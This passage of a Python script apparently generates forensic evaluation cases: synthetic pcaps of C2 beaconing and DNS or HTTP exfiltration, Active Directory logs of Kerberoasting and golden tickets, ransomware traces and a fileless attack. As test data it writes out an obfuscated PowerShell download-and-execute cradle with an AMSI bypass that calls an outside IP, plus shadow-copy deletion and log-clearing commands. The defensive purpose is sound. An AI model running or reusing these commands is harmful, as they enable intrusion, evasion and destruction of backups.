#!/usr/bin/env python3
"""Generer les cas d'evaluation reseau, Active Directory, rancongiciel et sans fichier.

Cas produits (deterministes, petits fichiers) :
    net_c2_beacon_pcap          beacon HTTPS (JA3, certificat auto-signe) + DNS
    net_dns_tunnel_exfil        exfiltration par tunnel DNS (TXT)
    net_http_exfil_carving      archive televersee par HTTP POST (a extraire)
    ad_kerberoasting_dcsync     4769 RC4 sur des SPN puis 4662 DS-Replication depuis un poste
    ad_golden_ticket            TGS sans TGT, compte inexistant, ticket de 10 ans
    ransomware_antiforensics    1102/104, vssadmin, bcdedit, renommages, timestomping MFT
    fileless_powershell_memory  PowerShell encode a chargement reflectif (C2 revele par desobfuscation)

Aucune dependance externe. Usage :
    python eval/build_network_ad_cases.py [dossier_suite]
Le module expose aussi PcapWriter et les constructeurs de paquets (tests).
"""

import base64
import datetime
import gzip
import hashlib
import io
import json
import os
import random
import struct
import sys
import zipfile

HERE = os.path.dirname(os.path.abspath(__file__))
SUITE = os.path.join(HERE, 'suite')
T0 = datetime.datetime(2026, 10, 12, 8, 0, 0, tzinfo=datetime.timezone.utc).timestamp()


# ============================================================================
# Ecriture PCAP (Ethernet / IPv4 / TCP / UDP)
# ============================================================================

def _csum(data):
    if len(data) % 2:
        data += b'\x00'
    s = sum(struct.unpack('>%dH' % (len(data) // 2), data))
    while s >> 16:
        s = (s & 0xFFFF) + (s >> 16)
    return (~s) & 0xFFFF


def _ip(addr):
    return bytes(int(x) for x in addr.split('.'))


def ipv4(src, dst, proto, payload, ident=0, ttl=64):
    hdr = struct.pack('>BBHHHBBH4s4s', 0x45, 0, 20 + len(payload), ident & 0xFFFF, 0x4000, ttl, proto, 0,
                      _ip(src), _ip(dst))
    hdr = hdr[:10] + struct.pack('>H', _csum(hdr)) + hdr[12:]
    return hdr + payload


def tcp(src, dst, sport, dport, seq, ack, flags, payload=b''):
    hdr = struct.pack('>HHIIBBHHH', sport, dport, seq & 0xFFFFFFFF, ack & 0xFFFFFFFF, 5 << 4, flags,
                      64240, 0, 0)
    pseudo = _ip(src) + _ip(dst) + struct.pack('>BBH', 0, 6, len(hdr) + len(payload))
    hdr = hdr[:16] + struct.pack('>H', _csum(pseudo + hdr + payload)) + hdr[18:]
    return ipv4(src, dst, 6, hdr + payload)


def udp(src, dst, sport, dport, payload):
    hdr = struct.pack('>HHHH', sport, dport, 8 + len(payload), 0)
    pseudo = _ip(src) + _ip(dst) + struct.pack('>BBH', 0, 17, 8 + len(payload))
    hdr = hdr[:6] + struct.pack('>H', _csum(pseudo + hdr + payload) or 0xFFFF)
    return ipv4(src, dst, 17, hdr + payload)


def ether(ip_packet, src_mac=b'\x02\x00\x00\x00\x00\x01', dst_mac=b'\x02\x00\x00\x00\x00\x02'):
    return dst_mac + src_mac + b'\x08\x00' + ip_packet


class PcapWriter:
    """Capture pcap classique (petit boutiste, microsecondes, Ethernet)."""

    def __init__(self):
        self.records = []

    def add(self, ts, frame):
        self.records.append((ts, frame))

    def to_bytes(self):
        out = [struct.pack('<IHHiIII', 0xa1b2c3d4, 2, 4, 0, 0, 65535, 1)]
        for ts, frame in sorted(self.records, key=lambda r: r[0]):
            sec = int(ts)
            usec = int(round((ts - sec) * 1e6))
            if usec >= 1000000:
                sec, usec = sec + 1, usec - 1000000
            out.append(struct.pack('<IIII', sec, usec, len(frame), len(frame)) + frame)
        return b''.join(out)

    def write(self, path):
        with open(path, 'wb') as f:
            f.write(self.to_bytes())


SYN, ACK, PSH, FIN = 0x02, 0x10, 0x08, 0x01


def tcp_session(w, ts, client, cport, server, sport, exchanges, mss=1400, rtt=0.02, isn=(1000, 5000)):
    """Connexion TCP complete : poignee de main, echanges [(c2s, s2c)], fermeture. Retourne ts final."""
    cseq, sseq = isn
    w.add(ts, ether(tcp(client, server, cport, sport, cseq, 0, SYN)))
    w.add(ts + rtt / 2, ether(tcp(server, client, sport, cport, sseq, cseq + 1, SYN | ACK)))
    w.add(ts + rtt, ether(tcp(client, server, cport, sport, cseq + 1, sseq + 1, ACK)))
    cseq, sseq, t = cseq + 1, sseq + 1, ts + rtt
    for c2s, s2c in exchanges:
        for direction, data in ((0, c2s), (1, s2c)):
            for i in range(0, len(data), mss):
                seg = data[i:i + mss]
                t += 0.001
                if direction == 0:
                    w.add(t, ether(tcp(client, server, cport, sport, cseq, sseq, PSH | ACK, seg)))
                    cseq += len(seg)
                else:
                    w.add(t, ether(tcp(server, client, sport, cport, sseq, cseq, PSH | ACK, seg)))
                    sseq += len(seg)
            t += rtt / 2
    w.add(t + 0.001, ether(tcp(client, server, cport, sport, cseq, sseq, FIN | ACK)))
    w.add(t + 0.002, ether(tcp(server, client, sport, cport, sseq, cseq + 1, FIN | ACK)))
    w.add(t + 0.003, ether(tcp(client, server, cport, sport, cseq + 1, sseq + 1, ACK)))
    return t + 0.003


# ---- DNS ----------------------------------------------------------------

def dns_name(name):
    return b''.join(bytes([len(p)]) + p.encode() for p in name.split('.') if p) + b'\x00'


def dns_query(tid, name, qtype=1):
    return struct.pack('>HHHHHH', tid, 0x0100, 1, 0, 0, 0) + dns_name(name) + struct.pack('>HH', qtype, 1)


def dns_response(tid, name, qtype=1, answers=(), rcode=0):
    body = dns_name(name) + struct.pack('>HH', qtype, 1)
    rr = b''
    for value in answers:
        if qtype == 1:
            rdata = _ip(value)
        elif qtype == 16:
            rdata = bytes([len(value)]) + value.encode()
        else:
            rdata = dns_name(value)
        rr += b'\xc0\x0c' + struct.pack('>HHIH', qtype, 1, 300, len(rdata)) + rdata
    return struct.pack('>HHHHHH', tid, 0x8180 | rcode, 1, len(answers), 0, 0) + body + rr


def dns_exchange(w, ts, client, resolver, tid, name, qtype=1, answers=(), rcode=0, sport=53000):
    w.add(ts, ether(udp(client, resolver, sport, 53, dns_query(tid, name, qtype))))
    w.add(ts + 0.004, ether(udp(resolver, client, 53, sport, dns_response(tid, name, qtype, answers, rcode))))


# ---- TLS ----------------------------------------------------------------

def tls_record(ctype, body, version=0x0301):
    return struct.pack('>BHH', ctype, version, len(body)) + body


def _ext(etype, data):
    return struct.pack('>HH', etype, len(data)) + data


def client_hello(sni=None, ciphers=(0xc02b, 0xc02f, 0xc02c, 0xc030, 0x009c, 0x009d, 0x002f, 0x0035),
                 groups=(29, 23, 24), point_formats=(0,), alpn=('h2', 'http/1.1'),
                 sig_algs=(0x0403, 0x0804, 0x0401), versions=None, version=0x0303, extra_exts=(),
                 random_bytes=b'\x11' * 32):
    exts = b''
    if sni:
        name = sni.encode()
        exts += _ext(0, struct.pack('>HBH', len(name) + 3, 0, len(name)) + name)
    for etype in extra_exts:
        exts += _ext(etype, b'')
    if groups:
        g = b''.join(struct.pack('>H', x) for x in groups)
        exts += _ext(10, struct.pack('>H', len(g)) + g)
    if point_formats is not None:
        exts += _ext(11, bytes([len(point_formats)]) + bytes(point_formats))
    if sig_algs:
        s = b''.join(struct.pack('>H', x) for x in sig_algs)
        exts += _ext(13, struct.pack('>H', len(s)) + s)
    if alpn:
        a = b''.join(bytes([len(p)]) + p.encode() for p in alpn)
        exts += _ext(16, struct.pack('>H', len(a)) + a)
    if versions:
        v = b''.join(struct.pack('>H', x) for x in versions)
        exts += _ext(43, bytes([len(v)]) + v)
    cs = b''.join(struct.pack('>H', c) for c in ciphers)
    body = (struct.pack('>H', version) + random_bytes + b'\x00' + struct.pack('>H', len(cs)) + cs
            + b'\x01\x00' + struct.pack('>H', len(exts)) + exts)
    hs = b'\x01' + len(body).to_bytes(3, 'big') + body
    return tls_record(22, hs)


def _der(tag, content):
    n = len(content)
    if n < 128:
        return bytes([tag, n]) + content
    lb = n.to_bytes((n.bit_length() + 7) // 8, 'big')
    return bytes([tag, 0x80 | len(lb)]) + lb + content


def _der_name(cn, org=None):
    def rdn(oid, value):
        return _der(0x31, _der(0x30, _der(0x06, oid) + _der(0x0c, value.encode())))
    parts = rdn(b'\x55\x04\x03', cn)
    if org:
        parts = rdn(b'\x55\x04\x0a', org) + parts
    return _der(0x30, parts)


def fake_certificate(subject_cn, issuer_cn, org=None, not_before='260901000000Z', not_after='270901000000Z'):
    """Certificat X.509 DER minimal (signature factice) pour les captures de test."""
    alg = _der(0x30, _der(0x06, b'\x2a\x86\x48\x86\xf7\x0d\x01\x01\x0b') + b'\x05\x00')
    tbs = _der(0x30, _der(0xa0, _der(0x02, b'\x02')) + _der(0x02, b'\x01\x23\x45') + alg
               + _der_name(issuer_cn, org) + _der(0x30, _der(0x17, not_before.encode()) + _der(0x17, not_after.encode()))
               + _der_name(subject_cn, org) + _der(0x30, alg + _der(0x03, b'\x00' + b'\x01' * 16)))
    return _der(0x30, tbs + alg + _der(0x03, b'\x00' + b'\x02' * 32))


def server_flight(cipher=0xc02f, cert=None, version=0x0303):
    body = struct.pack('>H', version) + b'\x22' * 32 + b'\x00' + struct.pack('>H', cipher) + b'\x00'
    exts = _ext(0xff01, b'\x00')
    body += struct.pack('>H', len(exts)) + exts
    out = b'\x02' + len(body).to_bytes(3, 'big') + body
    if cert:
        certs = len(cert).to_bytes(3, 'big') + cert
        cbody = len(certs).to_bytes(3, 'big') + certs
        out += b'\x0b' + len(cbody).to_bytes(3, 'big') + cbody
    return tls_record(22, out, 0x0303) + tls_record(20, b'\x01', 0x0303)


def tls_session(w, ts, client, cport, server, sni, cert, app_out, app_in, hello_kwargs=None, isn=(1000, 5000)):
    hello = client_hello(sni=sni, **(hello_kwargs or {}))
    exchanges = [(hello, server_flight(cert=cert)),
                 (tls_record(20, b'\x01', 0x0303) + tls_record(23, app_out, 0x0303), tls_record(23, app_in, 0x0303))]
    return tcp_session(w, ts, client, cport, server, 443, exchanges, isn=isn)


def http_request(method, host, uri, ua, body=b'', ctype=None, extra=None):
    lines = [f'{method} {uri} HTTP/1.1', f'Host: {host}', f'User-Agent: {ua}', 'Accept: */*']
    if ctype:
        lines.append(f'Content-Type: {ctype}')
    if body or method in ('POST', 'PUT'):
        lines.append(f'Content-Length: {len(body)}')
    lines += list(extra or [])
    return ('\r\n'.join(lines) + '\r\n\r\n').encode() + body


def http_response(status, body=b'', ctype='text/html', extra=None):
    reason = {200: 'OK', 201: 'Created', 204: 'No Content', 404: 'Not Found'}.get(status, 'OK')
    lines = [f'HTTP/1.1 {status} {reason}', 'Server: nginx', f'Content-Type: {ctype}',
             f'Content-Length: {len(body)}'] + list(extra or [])
    return ('\r\n'.join(lines) + '\r\n\r\n').encode() + body


BROWSER_UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0 Safari/537.36'


# ============================================================================
# Cas reseau
# ============================================================================

C2_IP, C2_DOMAIN = '185.225.73.90', 'cdn-telemetry-sync.net'
BEACON_HELLO = {'ciphers': (0xc02c, 0xc02b, 0xc030, 0xc02f, 0x009f, 0x009e, 0xc024, 0xc023, 0x0035, 0x002f),
                'groups': (29, 23, 24), 'alpn': None, 'sig_algs': (0x0401, 0x0501, 0x0201),
                'extra_exts': (23, 0xff01)}


def build_c2_beacon(case_dir):
    w = PcapWriter()
    host, resolver = '10.20.30.15', '10.20.30.1'
    rnd = random.Random(15)
    # Bruit : navigation irreguliere
    benign = [('www.wikipedia.org', '185.15.59.224'), ('outlook.office365.com', '52.97.146.162'),
              ('www.lemonde.fr', '151.101.2.217')]
    t = T0
    tid = 100
    for i in range(12):
        name, ip = benign[i % 3]
        dns_exchange(w, t, host, resolver, tid, name, answers=(ip,), sport=50000 + i)
        tls_session(w, t + 0.05, host, 52000 + i, ip, name, fake_certificate(name, 'DigiCert Global G2', 'DigiCert'),
                    bytes(rnd.randrange(256) for _ in range(rnd.randrange(300, 900))),
                    bytes(rnd.randrange(256) for _ in range(rnd.randrange(2000, 9000))),
                    {'versions': (0x0304, 0x0303), 'extra_exts': (23, 0xff01, 51)}, isn=(rnd.randrange(1 << 30), rnd.randrange(1 << 30)))
        t += rnd.choice((37, 95, 141, 213, 18, 402))
        tid += 1
    # Implant : resolution puis beacon HTTPS toutes les 60 s (+/- 0,5 s), taille constante
    dns_exchange(w, T0 + 30, host, resolver, 900, C2_DOMAIN, answers=(C2_IP,), sport=51999)
    cert = fake_certificate(C2_DOMAIN, C2_DOMAIN)
    for i in range(24):
        ts = T0 + 31 + i * 60 + rnd.uniform(-0.5, 0.5)
        tls_session(w, ts, host, 49700 + i, C2_IP, C2_DOMAIN, cert, b'\x17' * 211, b'\x18' * 96, BEACON_HELLO,
                    isn=(rnd.randrange(1 << 30), rnd.randrange(1 << 30)))
    path = os.path.join(case_dir, 'ws-fin-02_capture.pcap')
    w.write(path)
    return path


TUNNEL_DOMAIN = 'cdnsync-metrics.xyz'


def build_dns_tunnel(case_dir):
    w = PcapWriter()
    host, resolver = '10.20.30.22', '10.20.30.1'
    rnd = random.Random(22)
    t = T0
    for i, (name, ip) in enumerate([('www.google.com', '142.250.179.100'), ('teams.microsoft.com', '52.113.194.132'),
                                    ('intranet.corp.local', '10.20.0.10'), ('www.service-public.fr', '160.92.168.33'),
                                    ('update.microsoft.com', '13.107.4.50')] * 4):
        dns_exchange(w, t, host, resolver, 10 + i, name, answers=(ip,), sport=40000 + i)
        t += rnd.uniform(5, 40)
    dns_exchange(w, t, host, resolver, 99, 'intranet-old.corp.local', rcode=3, sport=40100)
    secret = ('NOM;PRENOM;IBAN;SALAIRE\n' + ''.join(
        f'EMPLOYE{i:03d};Prenom{i};FR76 3000 6000 01{i:010d} 89;{30000 + i * 517}\n' for i in range(60))).encode()
    chunks = base64.b32encode(secret).decode().rstrip('=').lower()
    t = T0 + 600
    for seq, i in enumerate(range(0, len(chunks), 56)):
        name = f'{chunks[i:i + 56]}.{seq:04d}.s7.{TUNNEL_DOMAIN}'
        dns_exchange(w, t, host, resolver, 2000 + seq, name, qtype=16, answers=('ok',), sport=41000 + seq % 2000)
        t += rnd.uniform(0.2, 0.6)
    path = os.path.join(case_dir, 'ws-rh-04_dns.pcap')
    w.write(path)
    return path


EXFIL_IP, EXFIL_PORT, EXFIL_NAME = '45.155.205.99', 8080, 'rh_salaires_2026.zip'


def exfil_archive():
    buf = io.BytesIO()
    rnd = random.Random(40)
    with zipfile.ZipFile(buf, 'w', zipfile.ZIP_STORED) as z:
        for name, size in (('salaires_2026.xlsx', 38000), ('contrats/cdi_direction.pdf', 24000)):
            info = zipfile.ZipInfo(name, date_time=(2026, 10, 11, 18, 2, 0))
            z.writestr(info, bytes(rnd.randrange(256) for _ in range(size)))
    return buf.getvalue()


def build_http_exfil(case_dir):
    w = PcapWriter()
    host, resolver = '10.20.30.40', '10.20.30.1'
    t = T0
    pages = [('intranet.corp.local', '10.20.0.10', '/rh/accueil'), ('www.legifrance.gouv.fr', '160.92.168.29', '/'),
             ('intranet.corp.local', '10.20.0.10', '/rh/conges'), ('www.legifrance.gouv.fr', '160.92.168.29', '/codes')]
    for i, (hname, ip, uri) in enumerate(pages * 2):
        dns_exchange(w, t, host, resolver, 300 + i, hname, answers=(ip,), sport=45000 + i)
        tcp_session(w, t + 0.05, host, 53000 + i, ip, 80,
                    [(http_request('GET', hname, uri, BROWSER_UA),
                      http_response(200, b'<html><body>' + b'contenu ' * (150 + i * 20) + b'</body></html>'))])
        t += 47 + i * 13
    archive = exfil_archive()
    boundary = '----PhoenixBoundary7MA4YWxk'
    body = (f'--{boundary}\r\nContent-Disposition: form-data; name="file"; filename="{EXFIL_NAME}"\r\n'
            f'Content-Type: application/zip\r\n\r\n').encode() + archive + f'\r\n--{boundary}--\r\n'.encode()
    ua = 'Mozilla/5.0 (Windows NT; Windows NT 10.0; fr-FR) WindowsPowerShell/5.1.19041.4648'
    t = T0 + 900
    tcp_session(w, t, host, 61234, EXFIL_IP, EXFIL_PORT,
                [(http_request('POST', f'{EXFIL_IP}:{EXFIL_PORT}', '/upload', ua, body,
                               f'multipart/form-data; boundary={boundary}'),
                  http_response(200, b'{"status":"ok"}', 'application/json'))])
    path = os.path.join(case_dir, 'ws-rh-07_http.pcap')
    w.write(path)
    return path, hashlib.sha256(archive).hexdigest()


# ============================================================================
# Cas Active Directory, rancongiciel et sans fichier (exports JSON / CSV)
# ============================================================================

def _iso(offset):
    return datetime.datetime.fromtimestamp(T0 + offset, tz=datetime.timezone.utc).strftime('%Y-%m-%dT%H:%M:%S.%fZ')


class _Events:
    def __init__(self, computer, first_record):
        self.computer = computer
        self.record = first_record
        self.items = []

    def add(self, offset, event_id, message, **fields):
        self.record += 1
        item = {'timestamp': _iso(offset), 'EventID': event_id, 'RecordID': self.record,
                'Computer': fields.pop('Computer', self.computer), 'Channel': fields.pop('Channel', 'Security'),
                'message': message}
        item.update(fields)
        self.items.append(item)

    def write(self, path):
        with open(path, 'w', encoding='utf-8') as f:
            json.dump(sorted(self.items, key=lambda e: e['timestamp']), f, indent=1, ensure_ascii=False)


REPL_GUIDS = ('{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}', '{1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}')


def build_kerberoasting(case_dir):
    ev = _Events('DC01.corp.local', 884200)
    rnd = random.Random(7)
    users = ['a.bernard', 'c.petit', 'l.moreau', 'n.roux', 's.fournier']
    for i in range(40):  # bruit : TGT/TGS AES legitimes
        u = users[i % 5]
        off = i * 61 + rnd.randrange(20)
        ev.add(off, 4768, f'Ticket TGT demande pour {u}', TargetUserName=u, TargetDomainName='CORP',
               IpAddress=f'::ffff:10.10.5.{50 + i % 5}', TicketEncryptionType='0x12', Status='0x0')
        ev.add(off + 2, 4769, f'Ticket de service demande par {u}', TargetUserName=f'{u}@CORP.LOCAL',
               ServiceName=rnd.choice(['FS01$', 'EXCH01$', 'PRINT01$']), IpAddress=f'::ffff:10.10.5.{50 + i % 5}',
               TicketEncryptionType='0x12', TicketOptions='0x40810000', Status='0x0')
    ev.add(2400, 4624, 'Ouverture de session reseau', TargetUserName='j.martin', TargetDomainName='CORP',
           LogonType=3, IpAddress='10.10.5.23', WorkstationName='WS-ADM-07', AuthenticationPackageName='Kerberos')
    ev.add(2401, 4768, 'Ticket TGT demande pour j.martin', TargetUserName='j.martin', TargetDomainName='CORP',
           IpAddress='::ffff:10.10.5.23', TicketEncryptionType='0x12', Status='0x0')
    for k, svc in enumerate(('svc_sql', 'svc_backup', 'svc_web', 'svc_sharepoint', 'svc_crm')):
        ev.add(2410 + k * 2, 4769, f'Ticket de service RC4 demande pour {svc}', TargetUserName='j.martin@CORP.LOCAL',
               ServiceName=svc, ServiceSid=f'S-1-5-21-1004336348-1177238915-682003330-{3100 + k}',
               IpAddress='::ffff:10.10.5.23', TicketEncryptionType='0x17', TicketOptions='0x40810000', Status='0x0')
    ev.add(3600, 4672, 'Privileges speciaux attribues a la nouvelle ouverture de session',
           SubjectUserName='j.martin', SubjectDomainName='CORP',
           PrivilegeList='SeBackupPrivilege SeRestorePrivilege SeDebugPrivilege')
    ev.add(3605, 4624, 'Ouverture de session reseau', TargetUserName='svc_backup', TargetDomainName='CORP',
           LogonType=3, IpAddress='10.10.5.23', WorkstationName='WS-ADM-07', AuthenticationPackageName='Kerberos')
    for k, guid in enumerate(REPL_GUIDS * 2):
        ev.add(3610 + k, 4662, 'Une operation a ete effectuee sur un objet (replication de l\'annuaire)',
               SubjectUserName='svc_backup', SubjectDomainName='CORP', ObjectServer='DS',
               ObjectType='%{19195a5b-6da0-11d0-afd3-00c04fd930c9}', ObjectName='DC=corp,DC=local',
               AccessMask='0x100', Properties=f'%%7688 {guid} {{19195a5b-6da0-11d0-afd3-00c04fd930c9}}',
               IpAddress='10.10.5.23', WorkstationName='WS-ADM-07')
    for k in range(4):  # replication legitime entre controleurs
        ev.add(600 + k * 900, 4662, 'Une operation a ete effectuee sur un objet (replication DC02)',
               SubjectUserName='DC02$', SubjectDomainName='CORP', ObjectServer='DS', ObjectName='DC=corp,DC=local',
               AccessMask='0x100', Properties=f'%%7688 {REPL_GUIDS[0]}', IpAddress='10.10.1.11', WorkstationName='DC02')
    ev.write(os.path.join(case_dir, 'dc01_security.json'))


def build_golden_ticket(case_dir):
    ev = _Events('DC01.corp.local', 1203300)
    rnd = random.Random(9)
    users = ['a.bernard', 'c.petit', 'l.moreau', 'adm.dupuis']
    for i in range(30):
        u = users[i % 4]
        off = i * 97 + rnd.randrange(30)
        ip = f'::ffff:10.10.5.{60 + i % 4}'
        ev.add(off, 4768, f'Ticket TGT demande pour {u}', TargetUserName=u, TargetDomainName='CORP',
               IpAddress=ip, TicketEncryptionType='0x12', Status='0x0')
        ev.add(off + 3, 4769, f'Ticket de service demande par {u}', TargetUserName=f'{u}@CORP.LOCAL',
               ServiceName=rnd.choice(['FS01$', 'EXCH01$', 'SQL01$']), IpAddress=ip, TicketEncryptionType='0x12',
               TicketOptions='0x40810000', Status='0x0')
    # Ticket forge : TGS sans TGT prealable, compte inexistant, RC4, depuis 10.10.7.44
    for k, svc in enumerate(('DC01$', 'cifs/DC01.corp.local', 'krbtgt', 'FS01$')):
        ev.add(3300 + k * 4, 4769, 'Ticket de service demande (aucun TGT 4768 correspondant)',
               TargetUserName='svc_admin_backup@corp.local', ServiceName=svc, IpAddress='::ffff:10.10.7.44',
               TicketEncryptionType='0x17', TicketOptions='0x40810010', Status='0x0')
    ev.add(3302, 4624, 'Ouverture de session reseau', TargetUserName='svc_admin_backup', TargetDomainName='corp.local',
           TargetUserSid='S-1-5-21-1004336348-1177238915-682003330-500', LogonType=3, IpAddress='10.10.7.44',
           WorkstationName='-', AuthenticationPackageName='Kerberos')
    ev.add(3303, 4672, 'Privileges speciaux attribues', SubjectUserName='svc_admin_backup',
           SubjectDomainName='corp.local', PrivilegeList='SeDebugPrivilege SeTcbPrivilege SeBackupPrivilege')
    ev.write(os.path.join(case_dir, 'dc01_security.json'))
    with open(os.path.join(case_dir, 'ad_users_export.csv'), 'w', encoding='utf-8', newline='') as f:
        f.write('SamAccountName,Enabled,Created,LastLogonDate,MemberOf\n')
        for u, grp in (('a.bernard', 'Utilisateurs'), ('c.petit', 'Utilisateurs'), ('l.moreau', 'Comptabilite'),
                       ('adm.dupuis', 'Admins du domaine'), ('svc_backup', 'Operateurs de sauvegarde'),
                       ('krbtgt', '')):
            f.write(f'{u},{"False" if u == "krbtgt" else "True"},2021-03-0{len(u) % 9 + 1} 09:00:00,'
                    f'2026-10-11 17:00:00,{grp}\n')
    start = datetime.datetime.fromtimestamp(T0 + 3290, tz=datetime.timezone.utc)
    with open(os.path.join(case_dir, 'ws_srv07_klist.csv'), 'w', encoding='utf-8', newline='') as f:
        f.write('Timestamp,Host,Client,Server,EncryptionType,StartTime,EndTime,RenewUntil,Flags\n')
        rows = [('l.moreau@CORP.LOCAL', 'krbtgt/CORP.LOCAL', 'AES-256-CTS-HMAC-SHA1-96', 10, 7),
                ('svc_admin_backup@corp.local', 'krbtgt/corp.local', 'RSADSI RC4-HMAC(NT)', 3650 * 24, 3650 * 24),
                ('svc_admin_backup@corp.local', 'cifs/DC01.corp.local', 'RSADSI RC4-HMAC(NT)', 10, 7 * 24)]
        for client, server, enc, hours, renew in rows:
            fmt = '%Y-%m-%d %H:%M:%S'
            f.write(f'{start.strftime(fmt)},WS-SRV-07,{client},{server},{enc},{start.strftime(fmt)},'
                    f'{(start + datetime.timedelta(hours=hours)).strftime(fmt)},'
                    f'{(start + datetime.timedelta(hours=renew)).strftime(fmt)},0x40e00000\n')


def build_ransomware(case_dir):
    ev = _Events('SRV-FICHIERS-01.corp.local', 552100)
    host = 'SRV-FICHIERS-01'
    for i in range(10):
        ev.add(i * 120, 4624, 'Ouverture de session', TargetUserName='svc_sauvegarde', LogonType=5,
               IpAddress='-', WorkstationName=host)
    ev.add(1500, 4624, 'Ouverture de session RDP', TargetUserName='adm.legrand', LogonType=10,
           IpAddress='10.10.9.31', WorkstationName='WS-ADM-02')
    cmds = [
        (1600, 'C:\\ProgramData\\svchostupd.exe', 'C:\\ProgramData\\svchostupd.exe --paths D:\\Partages'),
        (1601, 'C:\\Windows\\System32\\vssadmin.exe', 'vssadmin.exe delete shadows /all /quiet'),
        (1602, 'C:\\Windows\\System32\\wbem\\WMIC.exe', 'wmic.exe shadowcopy delete'),
        (1603, 'C:\\Windows\\System32\\bcdedit.exe', 'bcdedit.exe /set {default} recoveryenabled No'),
        (1604, 'C:\\Windows\\System32\\bcdedit.exe', 'bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures'),
        (1605, 'C:\\Windows\\System32\\wbadmin.exe', 'wbadmin.exe delete catalog -quiet'),
        (1900, 'C:\\Windows\\System32\\wevtutil.exe', 'wevtutil.exe cl System'),
        (1901, 'C:\\Windows\\System32\\wevtutil.exe', 'wevtutil.exe cl Security'),
    ]
    for off, image, cmd in cmds:
        ev.add(off, 4688, 'Un nouveau processus a ete cree', SubjectUserName='adm.legrand', NewProcessName=image,
               CommandLine=cmd, ParentProcessName='C:\\Windows\\System32\\cmd.exe')
    ev.add(1050, 4688, 'Un nouveau processus a ete cree', SubjectUserName='svc_sauvegarde',
           NewProcessName='C:\\Program Files\\Veeam\\VeeamAgent.exe', CommandLine='VeeamAgent.exe -job quotidien',
           ParentProcessName='C:\\Windows\\System32\\services.exe')
    ev.add(1902, 104, 'Le fichier journal System a ete efface', Channel='System', SubjectUserName='adm.legrand',
           Provider='Microsoft-Windows-Eventlog')
    ev.add(1903, 1102, 'Le journal d\'audit a ete efface', SubjectUserName='adm.legrand',
           Provider='Microsoft-Windows-Eventlog')
    ev.write(os.path.join(case_dir, 'srv-fichiers-01_events.json'))
    with open(os.path.join(case_dir, 'file_activity.csv'), 'w', encoding='utf-8', newline='') as f:
        f.write('timestamp,host,user,process,operation,source_path,target_path\n')
        for i in range(6):
            p = f'D:\\Partages\\Compta\\facture_{i:03d}.pdf'
            f.write(f'{_iso(900 + i * 60)},{host},c.petit,C:\\Windows\\explorer.exe,write,{p},{p}\n')
        for i in range(80):
            folder = ('Compta', 'RH', 'Direction', 'Projets')[i % 4]
            p = f'D:\\Partages\\{folder}\\document_{i:03d}.' + ('docx', 'xlsx', 'pdf')[i % 3]
            f.write(f'{_iso(1610 + i * 0.5)},{host},adm.legrand,C:\\ProgramData\\svchostupd.exe,rename,{p},{p}.crypt7\n')
        for folder in ('Compta', 'RH', 'Direction', 'Projets'):
            n = f'D:\\Partages\\{folder}\\LISEZ-MOI_CRYPT7.txt'
            f.write(f'{_iso(1660)},{host},adm.legrand,C:\\ProgramData\\svchostupd.exe,create,{n},{n}\n')
    with open(os.path.join(case_dir, 'mft_export.csv'), 'w', encoding='utf-8', newline='') as f:
        f.write('EntryNumber,SequenceNumber,ParentPath,FileName,FileSize,Created0x10,Created0x30,'
                'LastModified0x10,LastModified0x30,SI<FN\n')
        rows = [(1201, 'C:\\ProgramData', 'svchostupd.exe', 1843200, '2019-03-14 10:22:41', _iso(1550)[:19].replace('T', ' '),
                 '2019-03-14 10:22:41', _iso(1550)[:19].replace('T', ' '), 'True'),
                (1188, 'C:\\ProgramData\\Veeam', 'VeeamAgent.cfg', 4096, '2024-02-01 09:00:00', '2024-02-01 09:00:00',
                 '2026-10-11 22:00:00', '2024-02-01 09:00:00', 'False'),
                (1190, 'C:\\Windows\\System32', 'vssadmin.exe', 131072, '2023-05-10 08:11:02', '2023-05-10 08:11:02',
                 '2023-05-10 08:11:02', '2023-05-10 08:11:02', 'False')]
        for r in rows:
            f.write(f'{r[0]},3,{r[1]},{r[2]},{r[3]},{r[4]},{r[5]},{r[6]},{r[7]},{r[8]}\n')


C2_URL = 'http://194.58.112.77:8443/a.bin'


def fileless_command():
    inner = ("$u=('ht'+'tp://'+'194.58.112.'+'77:8443/'+'a.bin');"
             "$w=New-Object Net.WebClient;$w.Headers.Add('User-Agent','Mozilla/5.0');"
             "[Ref].Assembly.GetType(('{2}{0}{1}' -f 'ation.Amsi','Utils','System.Management.Autom'))"
             ".GetField(('amsi'+'InitFailed'),'NonPublic,Static').SetValue($null,$true);"
             "$b=$w.DownloadData($u);$a=[System.Reflection.Assembly]::Load($b);"
             "$a.EntryPoint.Invoke($null,(,[string[]]@()))")
    gz = base64.b64encode(gzip.compress(inner.encode(), mtime=0)).decode()
    outer = ("$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String('%s'));"
             "IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,"
             "[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()") % gz
    return 'powershell.exe -NoP -NonI -W Hidden -Exec Bypass -enc ' + base64.b64encode(outer.encode('utf-16-le')).decode()


def build_fileless(case_dir):
    procs = [
        (4, 0, 'System', '', '2026-10-12 06:58:01'),
        (612, 4, 'smss.exe', '\\SystemRoot\\System32\\smss.exe', '2026-10-12 06:58:02'),
        (884, 612, 'services.exe', 'C:\\Windows\\system32\\services.exe', '2026-10-12 06:58:05'),
        (1320, 884, 'svchost.exe', 'C:\\Windows\\system32\\svchost.exe -k netsvcs -p', '2026-10-12 06:58:09'),
        (2764, 2700, 'explorer.exe', 'C:\\Windows\\Explorer.EXE', '2026-10-12 07:41:12'),
        (3988, 2764, 'OUTLOOK.EXE', '"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE"', '2026-10-12 07:42:30'),
        (4120, 2764, 'WINWORD.EXE', '"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE" /n '
                                    '"C:\\Users\\l.moreau\\Downloads\\Facture_octobre.docm"', '2026-10-12 08:03:55'),
        (4312, 4120, 'powershell.exe', fileless_command(), '2026-10-12 08:04:02'),
        (5016, 2764, 'powershell.exe', 'powershell.exe -NoProfile -File C:\\Scripts\\inventaire.ps1', '2026-10-12 08:15:00'),
